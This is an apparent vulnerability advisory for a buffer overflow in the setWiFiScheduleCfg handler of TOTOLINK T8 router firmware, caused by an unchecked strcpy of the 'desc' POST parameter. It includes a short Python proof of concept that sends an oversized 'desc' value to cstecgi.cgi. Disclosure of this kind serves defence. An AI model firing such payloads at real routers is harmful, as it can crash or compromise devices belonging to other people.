## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/222/ids/36.html

## Affected version

T8_Firmware V4.1.5cu.861_B20230220

## Vulnerability details

In the T8_Firmware V4.1.5cu.861_B20230220 firmware has a buffer overflow vulnerability in the `setWiFiScheduleCfg` function. The `v15` variable receives the `desc` parameter from a POST request. However, since the user can control the input of `desc`, the `strcpy` can cause a buffer overflow vulnerability.

![image-20240902122636335](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902122636335.png)

![image-20240902122623475](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902122623475.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setWiFiScheduleCfg",
"addEffect":"1",
"enable":"1",
"desc":"b"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721012919451](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012919451.png)